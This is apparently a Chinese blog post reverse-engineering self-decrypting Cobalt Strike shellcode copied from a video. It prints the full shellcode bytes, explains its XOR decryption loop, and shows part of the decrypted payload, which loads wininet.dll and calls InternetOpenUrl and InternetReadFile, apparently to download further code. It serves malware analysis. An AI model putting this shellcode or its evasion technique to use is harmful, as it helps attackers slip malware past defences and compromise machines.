# 1. 序言
本文的撰写源于我在B站上观看的一段关于CS（Cobalt Strike）二次开发的视频。该视频已下架，但其中展示的一个功能引起了我的注意：生成的shellcode具有自混淆的能力。与传统的先对shellcode进行加密、再通过加载器解密的方法不同，这段shellcode能够自行解密，并且在解密前后看起来完全不同，但执行时却能正常运行。出于好奇，我向视频UP主询问了实现的具体思路，但未得到回复。因此，为了探究其背后的原理，我多次观看了该视频并注意到UP主在录制过程中无意间展示了完整的shellcode。于是，我手动将视频中的shellcode逐字节记录下来，从而开始了这次逆向分析。

# 2. shellcode

```
4C 8D 1D 3D 00 00 00 45 33 C9 4D 8D 43 0D 4D 8B
D0 B8 AB AA AA AA 41 F7 E1 41 8B C1 41 FF C1 C1
EA 03 8D 0C 52 C1 E1 02 2B C1 42 8A 44 18 01 41
30 02 49 FF C2 41 81 F9 A0 02 00 00 72 D3 49 FF
E0 CC CC CC C2 D6 C3 9B 9F 4A B0 1D 4E DB 75 6B
46 9E 48 5F D7 C3 E8 0D 06 52 05 73 0E 5F BB BB
CA 0B E4 5C 1B 9A 23 2A 11 9E 4E F3 3E 02 31 F1
FE DB 75 6B 03 E5 2E 5C DA 9D FB 78 3C B5 31 E3
2B 35 87 13 F2 99 F4 95 23 F4 31 E3 2B C1 87 13
F2 B9 77 58 95 BE 19 58 74 11 86 44 B1 2E DC 71
89 9E C2 3C 2F B8 AA 5C DA F1 DE 78 3A F5 B2 2E
F9 B2 AF F7 9F 8D F5 DA 02 B4 14 0F 81 93 08 D7
F6 28 C2 DA 0B 14 14 19 3F 97 04 DE 80 03 DE 69
2B 1C 30 48 34 B8 A6 EF 58 0F 97 4F 2B BA 11 AC
03 FD 85 F2 F3 2F 77 58 49 92 1B 1F 23 11 86 90
ED 24 D5 69 89 9E 7A 24 36 B3 AD 5C DA 59 E5 6F
22 9A B2 2E B1 9F AD EF FA 8D F5 E6 3C B5 10 1F
81 93 3C D4 EF 2F DE 7B 89 9E 76 2A 46 11 86 7C
C9 23 C2 69 89 9E 9E 1E 27 BA 82 5C DA A5 DC 71
21 B8 10 23 CD D2 E6 FB 9F 4A B0 55 C5 93 6D 27
CD 97 E3 70 8D 03 3B 5D 1E BD 31 52 2E CE CC 1F
D2 4B B0 1D 03 50 75 26 C3 16 B6 72 D3 C1 F5 7A
07 B8 35 57 07 5D 16 DD 14 C6 B0 95 4E DB 75 26
45 1E 82 10 D6 6A F9 1E 86 9E 4C 02 5E A0 EB 10
9E 08 30 21 4E 9C 00 78 04 56 BF 9B 92 39 C5 16
08 E3 19 6B 48 D9 47 94 9E 4A B0 E2 8C 93 F6 AA
42 97 F8 CA 87 38 68 55 C5 AE 12 23 CB 83 04 D2
14 82 4F CB 06 50 AD 23 CB 9B 14 64 4C 02 3D 50
F9 93 FE 93 B9 05 8B 16 CA BD F8 96 86 93 FE B3
B9 00 8B 16 CA 4D F8 96 85 97 FE 93 B9 00 8B 16
CA 55 F8 96 85 97 FE 8B B9 00 8B 16 CA AD F8 96
81 97 FE 9B B9 00 7C 9B 9F 5A B0 5C F7 9B 75 6B
46 5D 14 DA 27 4A 80 1D 4E E8 BC 94 96 9A 4E 96
2A 4A B0 1D 06 50 AD 2A CC 87 C2 DE 15 8F 34 CF
3A C2 3C E0 8B 56 31 84 DE B4 70 95 5A DA 34 64
F0 1E 81 11 CB 43 B1 99 9C AE 9F 2E 75 1F 87 12
F3 6E 90 58 7D 1B 46 B9 75 1F 82 64 48 02 3B D5
02 52 19 4F 6E 93 F0 52 58 0E 94 3D 4E 6F 75 EB
03 E5 03 D3 14 99 F1 E2 9A 93 F0 AB 32 C4 8F 16
D2 2D F4 96 89 93 FE B8 0E 5D 0B DA 60 9C 4F CE
02 56 E9 4F F6 D6 C3 9B D6 C1 EB 25 07 50 06 2B
0F 5D B8 D3 D6 C1 53 5C 11 9A 2B 2A 1B 97 9F C6
5C 07 3B 5D 6E 32 C3 95 B9 29 82 10 DE 6E F9 1E
8E 50 BF 64 F1 C2 8B DA 14 03 AC 54 4D 13 FE 5F
D7 9F C0 6B 76 A8 4E E2 B1 19 02 00 2D B9 E6 AB
AF 64 9F 2C 63 F5 5B 5A 6C FC F2 B6 BA 6D 9F 3A
60 EB 01 1C 3E A8 AF EE E8 32 CB 63 29 B2 19 1C
46
```

# 3. 逆向分析
为对上述shellcode进行逆向分析，我们首先使用一个简单的shellcode加载器将其加载到内存中，然后使用x64dbg进行调试。定位到shellcode的位置后，开始逐步分析其行为。

### 初始设置
shellcode的前几条指令如下：
- `lea r11, [rip + 0x3D]`：将一个地址赋值给r11寄存器。
- `xor r9d, r9d`：将r9寄存器的低32位清零。

### 寄存器赋值
接下来，shellcode继续执行以下操作：
- `lea r8, [r11 + 0xD]`：将r11寄存器加上偏移量0xD后的地址赋值给r8寄存器。
- `mov r10, r8`：将r8寄存器的值复制到r10寄存器。

### 解密程序
通过内存窗口查看r11和r8指向的地址内容，可以发现：
- 地址之间的第一个机器码是`C2`，前面还有三个`CC`指令，这些指令用于反调试，对加解密过程没有实际作用。
- 后面的12个字节是shellcode的密钥。

解密程序的关键部分如下：
- `r10`寄存器保存的是payload的地址，即`0x0000017B1B5C0051`。
- 通过内存窗口查看该地址，可以发现密钥结束的位置正是加密的payload开始的位置。
- payload的大小为672字节，密钥结束后的内容正好是672字节。

### 解密后的payload
解密得到的payload如下：
```
0000017B1B5C0051: 48 8B C4 48 89 58 10 48 89 70 18 48 89 78 20 55 H.ÄH.X.H.p.H.x U 
0000017B1B5C0061: 41 54 41 55 41 56 41 57 48 8D 68 A1 48 81 EC B0 ATAUAVAWH.h¡H.ì° 
0000017B1B5C0071: 00 00 00 45 33 ED C7 45 D7 4B 65 72 6E 44 88 6D ...E3íÇE×KernD.m 
0000017B1B5C0081: E3 44 88 6D D3 44 88 6D 2F 44 88 6D 17 44 88 6D ãD.mÓD.m/D.m.D.m 
0000017B1B5C0091: F3 C7 45 DB 65 6C 33 32 C7 45 DF 2E 64 6C 6C C7 óÇEÛel32ÇEß.dllÇ 
0000017B1B5C00A1: 45 B7 57 69 6E 69 C7 45 BB 6E 65 74 2E C7 45 BF E·WiniÇE»net.ÇE¿ 
0000017B1B5C00B1: 64 6C 6C 00 C7 45 C7 4C 6F 61 64 C7 45 CB 4C 69 dll.ÇEÇLoadÇEËLi 
0000017B1B5C00C1: 62 72 C7 45 CF 61 72 79 41 C7 45 1F 49 6E 74 65 brÇEÏaryAÇE.Inte 
0000017B1B5C00D1: C7 45 23 72 6E 65 74 C7 45 27 52 65 61 64 C7 45 ÇE#rnetÇE'ReadÇE 
0000017B1B5C00E1: 2B 46 69 6C 65 C7 45 07 49 6E 74 65 C7 45 0B 72 +FileÇE.InteÇE.r 
0000017B1B5C00F1: 6E 65 74 C7 45 0F 4F 70 65 6E C7 45 13 55 72 6C netÇE.OpenÇE.Url
```

通过以上分析，我们可以看到这段shellcode的自解密机制及其内部结构。